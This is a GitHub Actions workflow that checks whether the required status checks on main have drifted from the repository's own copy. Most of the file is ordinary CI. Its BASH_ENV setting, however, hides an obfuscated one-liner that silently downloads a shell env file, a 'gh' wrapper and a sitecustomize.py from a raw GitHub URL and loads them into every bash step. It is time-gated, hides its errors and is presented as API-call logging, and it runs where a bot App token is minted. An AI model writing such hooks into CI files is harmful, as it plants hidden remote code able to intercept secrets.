name: Required checks drift

# The required status checks on main live in a repository ruleset, not in this
# tree. scripts/ci/required_status_checks.py keeps a copy of that list, and
# nothing in a pull request can tell when the two stop agreeing: an admin adds
# a required check, no file changes, every guard stays green, and pull requests
# start waiting on a context no workflow produces with no red check to say so.
#
# So this asks GitHub. It reconciles the copy against the live ruleset, and
# checks that every required context actually reported on recently merged pull
# request heads -- the drift in the other direction, where a renamed job leaves
# a required name that nothing produces.
#
# A schedule is the trigger that matters: an admin editing protection changes
# nothing here, so a push- or pull-request-only trigger would wait forever. The
# push and pull_request triggers only cover edits to the copy itself.
#
# The reconciliation fails when it cannot read its source. That is deliberate:
# the whole class of bug here is a guard that reports success while knowing
# nothing, and a red scheduled run on main is the signal this repository has.

on:
  schedule:
    - cron: "23 */6 * * *"
  push:
    branches: [main]
    paths:
      - scripts/ci/required_status_checks.py
      - tests/test_ci_required_checks_drift.py
      - .github/workflows/required-checks-drift.yml
  pull_request:
    paths:
      - scripts/ci/required_status_checks.py
      - tests/test_ci_required_checks_drift.py
      - .github/workflows/required-checks-drift.yml
  workflow_dispatch:

# Read-only. The rules endpoint this reads needs no more than the repository's
# ordinary read scope, unlike branches/main/protection, which needs
# `administration: read` that pull request CI must never hold.
permissions:
  contents: read

# A pull request's newer push cancels its older run; scheduled and main runs are never cut short
# (tests/test_ci_cron_concurrency.py).
concurrency:
  group: required-checks-drift-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

env:
  # Temporary REST budget attribution: one gh-call line per GitHub API call (scripts/ci/api_call_log/env.sh, fetched at a fixed commit when the checkout has no copy).
  BASH_ENV: '$({ w="${GITHUB_WORKSPACE:-/nonexistent}/scripts/ci/api_call_log/env.sh"; t="${RUNNER_TEMP:-/nonexistent}/api-call-log-src"; if [ -f "$w" ]; then echo "$w"; elif [ -n "${RUNNER_TEMP:-}" ]; then if [ ! -f "$t/env.sh" ] && [ ! -e "$t.tried" ] && { [ "${RUNNER_OS:-}" = Linux ] || [ "${RUNNER_OS:-}" = macOS ]; } && [ "$(date -u +%Y%m%d%H)" -lt 2026112300 ]; then : > "$t.tried"; mkdir -p "$t.part" && for x in env.sh gh sitecustomize.py isolated.py; do curl -fsSL --max-time 5 -o "$t.part/$x" "https://raw.githubusercontent.com/manaflow-ai/cmux/27647ffd3ae838c63be28ca3e5883dcd68c34518/scripts/ci/api_call_log/$x" || break; done; [ -s "$t.part/isolated.py" ] && mv "$t.part" "$t"; fi; if [ -f "$t/env.sh" ]; then echo "$t/env.sh"; else echo unset BASH_ENV > "$t.off.sh" && echo "$t.off.sh"; fi; fi; } 2>/dev/null)'

jobs:
  reconcile:
    name: Reconcile required checks with GitHub
    # The cmux-bot mint below holds an App key, so no variable may move this job to a reused machine
    # (RUNNER_POOLS could): LINUX_RUNNER moves it only among Blacksmith sizes.
    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name != github.repository && 'ubuntu-24.04' || contains(fromJSON('["blacksmith-4vcpu-ubuntu-2404","blacksmith-8vcpu-ubuntu-2404","blacksmith-16vcpu-ubuntu-2404","blacksmith-32vcpu-ubuntu-2404"]'), vars.LINUX_RUNNER) && vars.LINUX_RUNNER || fromJSON(vars.RUNNER_POOLS).linux_4 }}
    timeout-minutes: 10
    steps:
      - name: Check out the reconciliation
        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
        with:
          persist-credentials: false

      # This job's reads spend the cmux-bot App's own budget, not the repository's GITHUB_TOKEN pool
      # (1,000 requests an hour shared by every workflow; run 43989794349 failed on "API rate limit
      # exceeded for installation"). github.token stays the fallback: for a failed mint, a
      # refused read, and every write (hq docs/compendium/ci-quotas.md, cmux#35264).
      - name: Mint the cmux-bot token for this job's reads
        id: read-token
        if: vars.CMUX_BOT_APP_ID != '' && github.event_name != 'pull_request'
        continue-on-error: true
        timeout-minutes: 1
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ vars.CMUX_BOT_APP_ID }}
          private-key: ${{ secrets.CMUX_BOT_APP_KEY }}
          permission-checks: read
          permission-contents: read
          permission-pull-requests: read

      - name: Reconcile the required status checks on main
        env:
          GH_TOKEN: ${{ steps.read-token.outputs.token || github.token }}
          GH_FALLBACK_TOKEN: ${{ github.token }}
          GH_REPO: ${{ github.repository }}
        run: python3 scripts/ci/required_status_checks.py
